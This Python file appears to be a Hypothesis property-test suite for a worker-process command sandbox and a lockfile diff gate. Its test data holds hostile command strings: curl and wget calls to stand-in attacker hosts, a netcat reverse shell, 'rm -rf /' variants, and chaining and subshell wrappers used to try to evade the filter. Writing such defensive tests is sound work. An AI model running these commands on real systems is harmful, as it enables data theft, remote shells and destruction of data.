"""Generative Hypothesis property tests for zero-trust worker process sandboxing (ADR-0009)."""

from __future__ import annotations

import json
import shlex
from pathlib import Path

from hypothesis import HealthCheck, given, settings
from hypothesis import strategies as st

from spec_ops.security import (
    FORBIDDEN_UTILITIES,
    ExecutionSandbox,
    extract_executables,
    is_loopback_address,
    validate_command,
)

FORBIDDEN_SAMPLES = [
    "curl https://attacker.com/exfiltrate",
    "wget http://attacker.com/malware",
    "sudo rm -rf /",
    "nc -e /bin/sh 10.0.0.1 4444",
    "/usr/bin/curl -s http://evil.com",
    "/bin/wget http://evil.com",
    "rm -rf /",
]

ALLOWED_BASELINE = ["git", "uv", "pytest", "ruff"]


@given(text=st.text())
def test_property_fuzz_arbitrary_command_strings_no_crash(text: str):
    """Invariant: validate_command and extract_executables never crash on arbitrary input."""
    # Must never raise an unhandled exception
    is_ok, reason, bin_name = validate_command(
        text,
        allowed_commands=ALLOWED_BASELINE,
        prohibited_commands=FORBIDDEN_UTILITIES,
    )
    assert isinstance(is_ok, bool)
    assert isinstance(reason, str)
    assert bin_name is None or isinstance(bin_name, str)


@given(
    payload=st.sampled_from(FORBIDDEN_SAMPLES),
    prefix=st.sampled_from(["", "FOO=bar ", "ENV=prod A=1 B=2 "]),
    wrapper=st.sampled_from([
        "git status && {cmd}",
        "git status; {cmd}",
        "{cmd} || git status",
        "echo $({cmd})",
        "echo `{cmd}`",
        "bash -c '{cmd}'",
        "sh -c '{cmd}'",
        "git status | {cmd}",
    ]),
)
def test_property_subshell_and_chaining_cannot_bypass_interceptor(
    payload: str, prefix: str, wrapper: str
):
    """Invariant: Subshell expansions ($(cmd), `cmd`), pipes, and operators (&&, ;, ||)

    cannot hide or bypass forbidden command detection.
    """
    full_cmd = wrapper.format(cmd=f"{prefix}{payload}")
    is_ok, reason, prohibited_bin = validate_command(
        full_cmd,
        allowed_commands=ALLOWED_BASELINE,
        prohibited_commands=FORBIDDEN_UTILITIES,
    )
    assert is_ok is False, f"Expected prohibited command in '{full_cmd}', but was allowed"
    assert prohibited_bin is not None
    assert prohibited_bin in FORBIDDEN_UTILITIES or prohibited_bin == "rm"


@given(
    arg=st.text(
        alphabet=st.characters(blacklist_categories=("Cs",), blacklist_characters="\n\r\x00'\"\\"),
        min_size=1,
        max_size=30,
    ),
    forbidden=st.sampled_from(["curl", "wget", "sudo", "rm", "nc"]),
)
def test_property_argument_boundary_does_not_false_positive(arg: str, forbidden: str):
    """Invariant: Forbidden words occurring as arguments (not executables) are allowed.

    e.g. `git log --grep="fixed curl"` or `pytest -k "test_curl"` must be permitted.
    """
    safe_arg = f"{arg}_{forbidden}"
    cmd = f"git log --grep={shlex.quote(safe_arg)}"
    is_ok, reason, prohibited_bin = validate_command(
        cmd,
        allowed_commands=["git"],
        prohibited_commands=FORBIDDEN_UTILITIES,
    )
    assert is_ok is True, f"Command '{cmd}' falsely blocked: {reason}"
    assert prohibited_bin is None


@given(
    flags=st.sampled_from(["-rf", "-fr", "-r -f", "--recursive --force", "-R -f", "-rf --no-preserve-root"]),
    target=st.sampled_from(["/", "/*", "/root", "/var", "/etc"]),
)
def test_property_destructive_rm_is_always_prohibited(flags: str, target: str):
    """Invariant: Destructive recursive filesystem deletion commands are always prohibited."""
    cmd = f"rm {flags} {target}"
    is_ok, reason, prohibited_bin = validate_command(
        cmd,
        allowed_commands=["rm", "git", "uv"],  # Even if rm were allowed
    )
    assert is_ok is False
    assert "Destructive filesystem deletion" in reason or "explicitly forbidden" in reason


@given(ip=st.ip_addresses(v=4))
def test_property_network_loopback_classification(ip):
    """Invariant: Loopback IPv4 addresses are identified with 100% precision."""
    ip_str = str(ip)
    is_loop = is_loopback_address(ip_str)
    assert is_loop == (ip.is_loopback or ip_str == "0.0.0.0")


@settings(suppress_health_check=[HealthCheck.function_scoped_fixture])
@given(
    args=st.lists(
        st.text(
            alphabet=st.characters(blacklist_categories=("Cs",), blacklist_characters="\n\r\x00"),
            min_size=0,
            max_size=20,
        ),
        min_size=0,
        max_size=5,
    ),
    unallowed_bin=st.sampled_from(["curl", "wget", "sudo", "unauthorized_tool", "evil_subshell"]),
    chain_mode=st.sampled_from(["direct", "and", "semicolon", "pipe"]),
)
def test_property_non_allowlisted_command_terminates_with_126_and_audits(
    tmp_path: Path, args: list[str], unallowed_bin: str, chain_mode: str
):
    """Invariant: Generative property testing using @given(st.lists(st.text())) verifies that any

    command execution attempting non-allowlisted binaries consistently terminates with exit code 126
    and writes an audit event, regardless of arguments or chaining.
    """
    sandbox = ExecutionSandbox(
        worktree_dir=tmp_path,
        allowed_commands=ALLOWED_BASELINE,
        prohibited_commands=FORBIDDEN_UTILITIES,
    )
    arg_str = " ".join(shlex.quote(a) for a in args)
    target_cmd = f"{unallowed_bin} {arg_str}".strip()

    if chain_mode == "direct":
        full_cmd = target_cmd
    elif chain_mode == "and":
        full_cmd = f"git status && {target_cmd}"
    elif chain_mode == "semicolon":
        full_cmd = f"git status; {target_cmd}"
    else:
        full_cmd = f"git status | {target_cmd}"

    res = sandbox.run(full_cmd)
    assert res.returncode == 126
    assert "Command Prohibited" in res.stderr

    log_path = tmp_path / ".security-audit.log"
    assert log_path.is_file()
    lines = [json.loads(line) for line in log_path.read_text(encoding="utf-8").splitlines() if line.strip()]
    assert len(lines) > 0
    last_event = lines[-1]
    assert last_event["exit_code"] == 126
    assert last_event["event"] == "SECURITY_ALERT_COMMAND_PROHIBITED"
    assert last_event["prohibited_binary"] == unallowed_bin


# --- Lockfile Invariant Property Tests (ADR-0009) ---

safe_filename_st = st.from_regex(r"^[a-zA-Z0-9_\-\.]+\.[a-zA-Z0-9]+$", fullmatch=True)
safe_dir_st = st.from_regex(r"^[a-zA-Z0-9_\-]+(/[a-zA-Z0-9_\-]+)*$", fullmatch=True)


@st.composite
def file_diff_tree_strategy(draw):
    from pathlib import Path
    base_files = draw(
        st.lists(
            st.tuples(st.one_of(st.just(""), safe_dir_st), safe_filename_st).map(
                lambda t: f"{t[0]}/{t[1]}".lstrip("/")
            ),
            min_size=0,
            max_size=15,
        )
    )
    clean_files = [f for f in base_files if Path(f).name not in ("pyproject.toml", "uv.lock")]
    include_protected = draw(st.booleans())
    if include_protected:
        protected_target = draw(st.sampled_from(["pyproject.toml", "uv.lock", "sub/pyproject.toml", "sub/uv.lock"]))
        clean_files.append(protected_target)
    return clean_files, include_protected


@given(
    diff_and_flag=file_diff_tree_strategy(),
    allows_dep=st.booleans(),
    task_id=st.integers(min_value=1, max_value=9999).map(lambda i: f"TASK-{str(i).zfill(4)}"),
    task_title=st.text(min_size=1, max_size=40),
)
def test_property_lockfile_diff_gate_invariance(diff_and_flag, allows_dep: bool, task_id: str, task_title: str):
    """Invariant: Any diff touching pyproject.toml or uv.lock without allows_dependencies strictly fails."""
    from pathlib import Path
    from spec_ops.core.models import Task
    from spec_ops.security.lockfile import PROTECTED_DEPENDENCY_FILES, check_diff_for_dependency_modifications

    diff_files, has_protected = diff_and_flag
    task = Task(
        id=task_id,
        title=task_title,
        status="Refined",
        allows_dependencies=allows_dep,
    )

    ok, errors = check_diff_for_dependency_modifications(diff_files, task.allows_dependencies)

    if has_protected and not task.allows_dependencies:
        assert ok is False
        assert len(errors) > 0
        assert "Unauthorized Dependency Modification" in errors[0]
        assert any(p in errors[0] for p in PROTECTED_DEPENDENCY_FILES)
    elif has_protected and task.allows_dependencies:
        assert ok is True
        assert errors == []
    else:
        assert ok is True
        assert errors == []

